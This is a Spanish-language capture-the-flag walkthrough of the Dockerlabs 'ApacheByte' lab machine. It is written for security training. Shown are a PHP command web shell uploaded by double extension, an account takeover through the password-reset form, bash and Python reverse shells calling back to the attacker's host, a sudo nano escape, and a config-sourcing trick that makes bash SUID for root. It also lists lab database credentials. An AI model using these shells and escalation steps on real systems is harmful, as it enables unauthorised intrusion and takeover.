
# Writeup Template: Maquina `[ ApacheByte ]`

- Tags: #ApacheByte
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ApacheByte](https://mega.nz/file/fRVlkaJY#4ifgzfMsJh6WMgWnd7W_Tnx_I-8N2nwCHU-GL3ZkfdM) File Upload en panel de administración.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x ApacheByte.zip
sudo bash auto_deploy.sh apachebyte.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/login.php: Possible admin folder
/uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/uploads/             (Status: 200) [Size: 937]
/libs/                (Status: 200) [Size: 941]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 1951]
/login.php            (Status: 200) [Size: 2035]
/register.php         (Status: 200) [Size: 2279]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/account.php          (Status: 302) [Size: 0] [--> login.php]
/upload.php           (Status: 302) [Size: 0] [--> index.php]
/posts                (Status: 301) [Size: 308] [--> http://172.17.0.2/posts/]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/libs                 (Status: 301) [Size: 307] [--> http://172.17.0.2/libs/]
```

Nos registramos en la siguiente **URL**:
```bash
http://172.17.0.2/register.php
```

Nuestras credenciales de acceso:
```bash
username: test
password: test
```

En cuenta tenemos lo siguiente, Un panel donde nos permite subir un **avatar** y el avatar que subamos al parecer se almacena en esta ruta:
```bash
http://172.17.0.2/uploads/avatars/
```

Ya subiendo una imagen **png** vemos que se carga, Ahora intentaremos ver si podemos cargar un archivo maliciosos **php** que nos permita realizar una llamada a nivel de sistema para ejecutar un comando:
**cmd.php**
```php
<?php
  system($_GET["cmd"]);
?>
```

Al intentar cargar nuestro archivomalicioso no nos deja:
```bash
Solo se permiten archivos JPG, PNG o GIF con extensión válida.
```

Ahora lo que aremos es interceptar la peticion para realizar un ataque de extensiones:
Una ves interceptada la peticion, Probaremos direfentes tipos de extensiones que nos proporciona la web [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=php%20exte#file-upload-general-methodology)
**Nota** No se hemos logrado colar un archivo malicisoso asi que lo siguiente que aremso es intentar cambiar nuestra contrasena e interceptar nuestra peticion:
```bash
username=test&numero=5032720792366351&new_password=test1&confirm_password=test1
```

Y desde la respuesta tenemos lo siguiente:
```bash
<img src="uploads/avatars/5032720792366351.jpg" alt="Avatar" class="avatar">
```

Sabemos que antes de subir una imagen como avatar ya existia la siguiente imagen:
```bash
[5597527595641235.jpg](http://172.17.0.2/uploads/avatars/5597527595641235.jpg)|2025-05-12 20:11|53K||
```

Ahora tambien sabemos que existe un autor **manager**
```bash
Autor: manager
```

Si que probaremos si es valido para intentar cambiarle su contrasena: quedando asi la peticion final:
```bash
username=manager&numero=5597527595641235&new_password=12345&confirm_password=12345
```

Enviamos la peticion: **ctrl + u** y nos responde el servidor con:
```bash
HTTP/1.1 200 OK
Date: Sun, 22 Jun 2025 22:33:20 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2206
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-
```

Asi que ahora intentamos conectarnos como el usaurio manager:

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Una ves que logramos conectarnos con estas credenciales, Intentaremos subir un post malicioso:
```bash
username: manager
password: 12345
```

### Ejecucion del Ataque
Tenemos un panel en el cual podemos subir **post** el cual si no esta sanitizado, Nos aprovecharemos de eso para cargar un archivo malicioso en esta ruta:
```bash
http://172.17.0.2/dashboard.php
```

Ahora ejecutamos un ataque de doble extension, Es decir subiremos un archivo malicioso asi:
```bash
cmd.php.jpg
```

Cundo le damos en subir imagen y despues en crear **posts** vemos que funciona nos permite subirlo:
al subirlo nos da la rua en donde es que se esta almacenando la imagen, Asi que una ves subido tenemos que apuntar a dicha ruta:
```bash
<img src="posts/uploads/cmd.php"
```

Apuntamos a la ruta e intetamos ejecutar comandoss
```bash
# Comandos para explotación
http://172.17.0.2/posts/uploads/cmd.php?cmd=whoami
```

### Intrusion
Ahora que tenemos capacidad de ejecutar comandos, Procedemos a ponernos en escucha.
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://172.17.0.2/posts/uploads/cmd.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/172.17.0.1/443%20%3C%261%27
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Enumerando los usuarios del sistema:
```bash
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
alex:x:1000:1000::/home/alex:/bin/bash
juan:x:1001:1001::/home/juan:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Tenemos la configuracion de la base de datos:
```bash
-rw-r--r-- 1 www-data www-data  523 May 12 20:04 db.php
```

Dentro de la configuracion tenemos credenciales validas para la base de datos:
```bash
<?php
$host = '127.0.0.1'; // <- 🔧 Usar TCP en lugar de socket
$db   = 'web_app';
$user = 'website';
$pass = 'jJ2$uR5hR8z@LkT4';
$charset = 'utf8mb4';
```

Nos conectamos por **TCP**
```bash
mysql -u website --protocol=TCP -p # ( jJ2$uR5hR8z@LkT4 )
```

Enumeramos las bases de datos:
```bash
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| web_app            |
+--------------------+
```

Migramos de base de datos:
```bash
mysql> use web_app;
```

Listamos las tablas:
```bash
show tables;
+-------------------+
| Tables_in_web_app |
+-------------------+
| users             |
+-------------------+
```

Hashes de los usuarios que no sirven de mucho:
```bash
select * from users;
+----+----------+--------------------------------------------------------------+-------+---------------------+------------------+
| id | username | password                                                     | role  | created_at          | numero           |
+----+----------+--------------------------------------------------------------+-------+---------------------+------------------+
| 27 | manager  | $2y$10$py7mPxnc51tgz7ZSzgGomOcdM9S2ef7sApwL5Ak.XcmyTJPLO43rW | admin | 2025-05-12 20:11:46 | 5597527595641235 |
| 28 | test     | $2y$10$dihlI.Fubof.NnCOyHrfIehUQKJ6Jdi1Lf4AJshxIhaGEjUVy3/x6 | user  | 2025-06-22 23:32:08 | 5032720792366351 |
+----+----------+--------------------------------------------------------------+-------+---------------------+------------------+
```

Ahora buscaremos por archivos en la carpteta **tmp** y tenemos lo siguiente: Un archivo **SUID**
```bash
srwxrwxrwx 1 juan juan 0 Jun 9 08:52 dev.sock
```

Ahora usamos este comando para filtrar por archivos que tengan que ver con **sock**
```bash
find / \( -path /usr -o -path /proc \) -prune -o -name "sock*" -print 2>/dev/null
```

Tenemos esta ruta:
```bash
/var/backups/socket.zip
```

Ahora descomprimimos el archivo:
```bash
unzip /var/backups/socket.zip
Archive:  /var/backups/socket.zip
  inflating: home/juan/socket_server.py
```

ahora vemos el contenido:
```bash
cat /tmp/home/juan/socket_server.py
```

### 1. **Ejecución arbitraria de codigo (`exec`)**
- **Problema:** Usa `exec(data.decode())` para ejecutar _cualquier código_ recibido por el socket sin validación.
- **Riesgo:** Permite a un atacante ejecutar comandos arbitrarios en el sistema (eliminar archivos, robar datos, instalar malware, etc.).
### 2. **Permisos de socket inseguros (`0o777`)**
- **Problema:** `os.chmod(sock_path, 0o777)` da acceso total a _todos los usuarios_ del sistema.
- **Riesgo:** Cualquier usuario (incluso no privilegiados) puede conectarse al socket y enviar código malicioso.
### 3. **Sin restricciones en el entorno de ejecucion**
- **Problema:** El diccionario `{"__builtins__": __builtins__}` permite el uso de todas las funciones built-in de Python.
- **Riesgo:** El atacante tiene acceso a módulos peligrosos como `os`, `subprocess`, `shutil`, etc.
### 4. **Sin autenticación ni control de acceso**
- **Problema:** Cualquier proceso con acceso al socket puede enviar código.
- **Riesgo:** Programas o usuarios maliciosos pueden explotar esto sin restricciones.
### 5. **Manejo de errores expuesto**
- **Problema:** Los mensajes de error se envían de vuelta al cliente (`conn.send(str(e).encode()`).
- **Riesgo:** Filtración de información sensible (estructura de archivos, librerías, etc.) que facilita ataques dirigidos.
### 6. **Falta de limites en la ejecucion**
- **Problema:** No hay control sobre tiempo de ejecución, uso de recursos o acceso a archivos.
- **Riesgo:**
    - _Denegación de servicio (DoS):_ Ejecutar `while True: pass` bloquea el proceso.
    - _Acceso a datos confidenciales:_ `print(open('/etc/passwd').read())`.
```python
import socket
import os

sock_path = "/tmp/dev.sock"
if os.path.exists(sock_path):
    os.remove(sock_path)

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(sock_path)
os.chmod(sock_path, 0o777)
server.listen(1)

while True:
    try:
        conn, _ = server.accept()
        data = conn.recv(2048)

        if data:
            try:
                exec(data.decode(), {"__builtins__": __builtins__})
                conn.send(b"Executed.\n")
            except Exception as e:
                conn.send(str(e).encode())

        conn.close()
    except:
        break

server.close()
```

Ahora intentaremos ver la manera de explotar este binario: De primeras intentamos este pero no vemos la salida del comando:
```bash
echo "import os; os.system('id')" | nc -U /tmp/dev.sock

Executed.
```

Ahora probamos con **subproccess**
```bash
echo 'import subprocess; raise Exception(subprocess.check_output("id", shell=True).decode())' | nc -U /tmp/dev.sock

uid=1001(juan) gid=1001(juan) groups=1001(juan)
```

Ahora que podemos ejecutar comandos, Intentaremos ganar acceso como este usuario
```bash
echo "import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('172.17.0.1',4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" | nc -U /tmp/dev.soc
```

###### Usuario `[ Juan ]`:
Listandos los permisos para este usuario tenemes el binario **nano** con permisos
```bash
sudo -l

User juan may run the following commands on 2a90de3a9544:
    (alex) NOPASSWD: /bin/nano # Tenemos una via potencial para elevar privilegios:
```

Ejeucutamos el binario:
```bash
sudo -u alex /bin/nan # Primero ejecutamos este
ctrl + r # despues este
ctrl + x # despues este
reset; sh 1>&0 2>&0 # Por ultimo este
```

###### Usuario `[ Alex ]`:
Listando los permisos para este usuario tenemos:
```bash
sudo -l

User alex may run the following commands on 2a90de3a9544:
    (ALL) NOPASSWD: /usr/local/bin/report_tool
```

Revisando el codigo tenemos lo siguiente:
```bash
cat /usr/local/bin/report_tool

#!/bin/bash
#
# report_tool: muestra la fecha o, si existe override, usa tu PATH local

CONF_FILE="./report_tool.conf"
if [ -r "$CONF_FILE" ]; then
    source "$CONF_FILE"
    if [ -n "$OVERRIDE_PATH" ]; then
        export PATH="$OVERRIDE_PATH:$PATH"
    fi
fi
exec date
```

El script **es vulnerable** a un ataque de **PATH hijacking** (secuestro de rutas de ejecución).:
**Vulnerabilidad clave**
```bash
export PATH="$OVERRIDE_PATH:$PATH"
```
1. **Confía en `OVERRIDE_PATH`**: Esta variable controla el primer lugar donde se buscan binarios.
2. **Carga configuración arbitraria**: El archivo `./report_tool.conf` se ejecuta con `source`.
3. **Ejecuta `date` sin ruta absoluta**: Usa el primer `date` encontrado en el PATH modificado.

#### Explotacion:
###### 1. Crear una configuracion maliciosa:
```bash
echo '/bin/bash -c "chmod u+s /bin/bash"' > ./report_tool.conf
```
###### 2. Crear una instruccion maliciosa `chmod u+s /bin/bash` en `report_tool`:
```bash
sudo -u root /usr/local/bin/report_tool 
Mon Jun 23 19:43:55 CEST 2025
```
###### 3. revisamos permsios de la bash
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora nos aprovechamos de esto para migrar como usuario root
```bash
# Comando para escalar al usuario: ( root )
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Abusamos de la funcion que nos permitia cambiar la contrasena de usuario para cambiarle su contrasena al **manager**
2. Subimos archivos malicisos al servidor
3. Aprendimos a pivotear entre usuarios